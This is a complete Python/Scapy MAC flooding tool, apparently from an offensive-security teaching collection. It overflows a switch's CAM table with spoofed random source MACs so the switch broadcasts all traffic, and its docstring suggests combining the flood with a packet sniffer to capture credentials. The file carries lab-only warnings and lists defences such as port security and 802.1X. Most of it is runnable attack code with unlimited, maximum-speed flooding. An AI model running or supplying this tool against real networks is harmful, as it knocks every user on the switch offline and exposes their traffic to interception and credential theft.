# topic: Network Attacks
# title: MAC Flooder (CAM Table Overflow)
# priority: 2

"""
mac_flooder.py - MAC Flooding / CAM Table Overflow Attack
==========================================================
Floods a network switch with Ethernet frames carrying randomly
generated source MAC addresses, exhausting the switch's CAM
table and forcing it into fail-open (hub) mode where all
traffic is broadcast to every port.

HOW SWITCHES WORK (the vulnerability being exploited)
------------------------------------------------------
A network switch maintains a CAM (Content Addressable Memory)
table that maps MAC addresses to the physical port each device
is connected to.

Normal operation:
  1. Frame arrives on port 3 from MAC aa:bb:cc:dd:ee:ff
  2. Switch records: aa:bb:cc:dd:ee:ff -> port 3 (learning)
  3. Frame destined for 11:22:33:44:55:66
  4. Switch looks up 11:22:33:44:55:66 -> port 7
  5. Frame forwarded only to port 7 (unicast - private)

Under MAC flooding:
  1. Attacker sends frames with thousands of random source MACs
  2. Switch learns a new fake MAC entry for each frame
  3. CAM table fills to capacity
  4. Switch fails open - broadcasts all frames to all ports
  5. All traffic visible to all hosts (behaves like a hub)

WHY THIS MATTERS
-----------------
On a modern switched network, a passive sniffer only sees:
  - Broadcast traffic (ARP, DHCP)
  - Traffic addressed to this machine

After a successful CAM flood:
  - ALL traffic on the switch is visible
  - Combine with Packet Sniffer to capture credentials

REAL-WORLD LIMITATIONS
-----------------------
Enterprise switches have defences:
  - Port security   : limits MACs learned per port
  - 802.1X          : authentication before learning
  - CAM aging       : entries expire, partially mitigating flooding

DEFENCES
---------
  - Port security (Cisco: switchport port-security maximum 1)
  - Dynamic ARP Inspection
  - 802.1X network access control
  - VLAN segmentation

PLATFORM SUPPORT
-----------------
Windows 11 : requires Administrator + Npcap
Linux/Kali : requires root

EDUCATIONAL USE ONLY.
MAC flooding disrupts service for all users on the affected
switch. Only use in an isolated lab on equipment you own.

Requirements:
    pip install scapy
    Windows: Npcap from https://npcap.com
"""

import logging
import os
import random
import sys
import threading
import time
from typing import Optional

IS_WINDOWS = os.name == "nt"
IS_LINUX   = sys.platform.startswith("linux")

try:
    from scapy.all import (
        Ether,
        IP,
        UDP,
        sendp,
        get_if_list,
        conf as scapy_conf,
    )
    scapy_conf.verb = 0
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False

logger = logging.getLogger(__name__)

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------
DEFAULT_PACKET_COUNT = 0        # 0 = unlimited
DEFAULT_INTERVAL     = 0.0      # 0 = maximum speed
BATCH_SIZE           = 100      # Packets per sendp() call
DISPLAY_INTERVAL     = 1.0      # Seconds between counter refreshes
MAC_BYTE_COUNT       = 6        # A MAC address is always 6 bytes
MIN_PAYLOAD_SIZE     = 18       # Minimum bytes to pad to valid frame size


# ---------------------------------------------------------------------------
# Privilege check
# ---------------------------------------------------------------------------

def check_privileges() -> bool:
    """
    Verify root/Administrator privileges for raw frame injection.
    """
    try:
        return os.getuid() == 0
    except AttributeError:
        try:
            import ctypes
            return bool(ctypes.windll.shell32.IsUserAnAdmin())
        except Exception:
            return False


# ---------------------------------------------------------------------------
# MAC generation
# ---------------------------------------------------------------------------

def generate_random_mac() -> str:
    """
    Generate a random 6-byte unicast MAC address.

    The first byte's LSB (least significant bit) is the multicast bit:
      0 = unicast  (switch learns it into the CAM table)
      1 = multicast (switch may not learn it - defeats the attack)

    We clear the multicast bit with bitwise AND 0xFE to ensure
    every generated MAC is unicast and will be learned by the switch.

    Returns
    -------
    MAC address string e.g. '3a:f1:7c:44:b2:09'
    """
    mac_bytes = [random.randint(0, 255) for _ in range(MAC_BYTE_COUNT)]

    # Clear the multicast bit on the first byte
    # 0xFE = 11111110 in binary - clears bit 0
    mac_bytes[0] &= 0xFE

    return ":".join(f"{b:02x}" for b in mac_bytes)


def build_flood_packet(
    src_mac: str,
    dst_mac: str = "ff:ff:ff:ff:ff:ff",
) -> Ether:
    """
    Build an Ethernet frame with a spoofed source MAC address.

    The destination MAC is broadcast (ff:ff:ff:ff:ff:ff) so the
    switch processes and learns the source MAC from every frame,
    maximising CAM table consumption.

    We add a minimal IP/UDP payload to produce valid-sized Ethernet
    frames. Undersized frames (less than 64 bytes) may be discarded
    by the switch's hardware before reaching the CAM learning logic.

    Parameters
    ----------
    src_mac : str   The spoofed source MAC to inject.
    dst_mac : str   Destination MAC (broadcast by default).
    """
    return (
        Ether(src=src_mac, dst=dst_mac)
        / IP(src="10.0.0.1", dst="10.0.0.2")
        / UDP(
            sport=random.randint(1024, 65535),
            dport=random.randint(1, 1024),
        )
        / (b"\x00" * MIN_PAYLOAD_SIZE)
    )


# ---------------------------------------------------------------------------
# Live statistics display
# ---------------------------------------------------------------------------

class FloodStats:
    """
    Thread-safe flood statistics with live terminal display.

    Tracks packets sent, elapsed time, and transmission rate.
    Runs in a daemon thread so it does not block the flood loop.
    """

    def __init__(self) -> None:
        self._sent    = 0
        self._lock    = threading.Lock()
        self._running = False
        self._thread  = None
        self._start   = time.time()

    def add(self, count: int = 1) -> None:
        with self._lock:
            self._sent += count

    def get_sent(self) -> int:
        with self._lock:
            return self._sent

    def start_display(self) -> None:
        self._running = True
        self._start   = time.time()
        self._thread  = threading.Thread(
            target=self._display_loop,
            daemon=True,
        )
        self._thread.start()

    def stop_display(self) -> None:
        self._running = False
        print()

    def _display_loop(self) -> None:
        while self._running:
            elapsed = time.time() - self._start
            sent    = self.get_sent()
            rate    = sent / elapsed if elapsed > 0 else 0.0
            print(
                f"\r  [*] Frames sent: {sent:>8,}  |  "
                f"Elapsed: {int(elapsed):>5}s  |  "
                f"Rate: {rate:>8,.0f} frames/s  "
                "  (Ctrl+C to stop)",
                end="",
                flush=True,
            )
            time.sleep(DISPLAY_INTERVAL)


# ---------------------------------------------------------------------------
# Flood engine
# ---------------------------------------------------------------------------

def run_flood(
    interface: str,
    packet_count: int,
    interval: float,
    stats: FloodStats,
) -> None:
    """
    Execute the MAC flood - generate and send frames until stopped.

    Performance design:
        Calling sendp() once per packet in a Python loop is slow
        due to per-call socket setup overhead. Batching BATCH_SIZE
        packets into a list and passing the whole list to sendp()
        processes them in a tight C loop - much faster.

    Parameters
    ----------
    interface    : str         Network interface to inject frames on.
    packet_count : int         Total frames to send (0 = unlimited).
    interval     : float       Seconds to sleep between batches.
    stats        : FloodStats  Statistics tracker for live display.
    """
    sent_total = 0

    while True:
        # Determine batch size
        if packet_count > 0:
            remaining  = packet_count - sent_total
            if remaining <= 0:
                break
            batch_size = min(BATCH_SIZE, remaining)
        else:
            batch_size = BATCH_SIZE

        # Build batch with unique random source MACs
        batch = [
            build_flood_packet(generate_random_mac())
            for _ in range(batch_size)
        ]

        try:
            sendp(batch, iface=interface, verbose=False)
        except OSError as exc:
            print(f"\n  [!] Send error: {exc}")
            logger.error("Flood send error: %s", exc)
            break

        sent_total += batch_size
        stats.add(batch_size)

        if interval > 0:
            time.sleep(interval)


# ---------------------------------------------------------------------------
# Interface listing
# ---------------------------------------------------------------------------

def list_interfaces() -> list:
    """List available network interfaces."""
    try:
        interfaces = get_if_list()
    except Exception as exc:
        print(f"  [!] Could not list interfaces: {exc}")
        if IS_WINDOWS:
            print("  [*] Make sure Npcap is installed and you are "
                  "running as Administrator.")
        return []

    print("\n  Available interfaces:\n")
    for i, iface in enumerate(interfaces, start=1):
        print(f"    {i:>2}.  {iface}")
    print()
    return interfaces


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def main() -> None:
    """
    Collect attack parameters and execute the MAC flood.
    """
    print("\n  MAC Flooder - CAM Table Overflow")
    print("  " + "-" * 33)
    print(f"  Platform : {sys.platform}")
    print("  [!] Requires Administrator (Windows) or root (Linux).")
    print("  [!] EDUCATIONAL USE ONLY.")
    print("  [!] Disrupts ALL users on the affected switch.")
    print("  [!] Only use in an isolated lab on equipment you own.")
    print("  [*] Enter 0 at any prompt to cancel.\n")

    if not SCAPY_AVAILABLE:
        print("  [!] Scapy is not installed: pip install scapy")
        if IS_WINDOWS:
            print("  [!] Also requires Npcap from https://npcap.com")
        return

    if not check_privileges():
        print("  [!] This module requires elevated privileges.")
        if IS_WINDOWS:
            print("  [*] Right-click your terminal and select "
                  "Run as Administrator.")
        else:
            print("  [*] Run with: sudo python mac_flooder.py")
        return

    if IS_WINDOWS:
        print("  [*] Windows detected - interface names may appear as GUIDs.")
        print("      Use the number selection to choose your interface.\n")

    # Interface selection
    interfaces = list_interfaces()
    if not interfaces:
        return

    raw = input(
        "  Select interface number (or type name directly): "
    ).strip()
    if raw == "0":
        return

    if raw.isdigit():
        idx = int(raw) - 1
        if not (0 <= idx < len(interfaces)):
            print("  [!] Invalid selection.")
            return
        interface = interfaces[idx]
    else:
        if raw not in interfaces:
            print(f"  [!] Interface '{raw}' not found.")
            return
        interface = raw

    print(f"  [+] Selected: {interface}")

    # Packet count
    print("\n  Packet count: how many frames to send before stopping.")
    print("  Press Enter for unlimited (stop with Ctrl+C).")
    raw_count = input("  Packet count [unlimited]: ").strip()
    if raw_count == "0":
        return
    if raw_count:
        if not raw_count.isdigit():
            print("  [!] Please enter a number.")
            return
        packet_count = int(raw_count)
    else:
        packet_count = DEFAULT_PACKET_COUNT

    # Transmission rate
    print("\n  Interval: seconds between frame batches.")
    print("  0 = maximum speed (most effective but most disruptive).")
    raw_interval = input("  Interval in seconds [0 - max speed]: ").strip()
    if raw_interval == "0" or not raw_interval:
        interval = DEFAULT_INTERVAL
    else:
        try:
            interval = float(raw_interval)
            if interval < 0:
                raise ValueError
        except ValueError:
            print("  [!] Please enter a positive number.")
            return

    # Confirm
    count_desc = (
        f"{packet_count:,} frames" if packet_count else "unlimited frames"
    )
    rate_desc = (
        f"{interval}s between batches" if interval else "maximum speed"
    )
    print(f"\n  Attack summary:")
    print(f"    Interface : {interface}")
    print(f"    Frames    : {count_desc}")
    print(f"    Rate      : {rate_desc}")
    print(f"    Batch size: {BATCH_SIZE} frames per send call")
    print(f"\n  This will flood the switch with random source MACs.")
    print(f"  All users on the switch may lose connectivity.")

    confirm = input("\n  Start flood? (y/n): ").strip().lower()
    if confirm != "y":
        print("  Cancelled.")
        return

    # Run flood
    print(f"\n  [*] Starting MAC flood on {interface}...\n")
    logger.info(
        "MAC flood started: iface=%s count=%d interval=%f",
        interface, packet_count, interval,
    )

    stats = FloodStats()
    stats.start_display()

    try:
        run_flood(interface, packet_count, interval, stats)
    except KeyboardInterrupt:
        pass

    stats.stop_display()

    # Summary
    final_count = stats.get_sent()
    print(f"\n  [*] Flood stopped.")
    print(f"  [*] Total frames sent : {final_count:,}")
    print(f"  [*] Unique MACs used  : ~{final_count:,} (one per frame)")
    print(f"\n  [*] Switch CAM tables recover automatically as entries expire.")
    print(f"      Normal network operation resumes within 60-300 seconds.")

    logger.info("MAC flood stopped. Total frames: %d", final_count)


# ---------------------------------------------------------------------------
# Entry point
# ---------------------------------------------------------------------------

if __name__ == "__main__":
    main()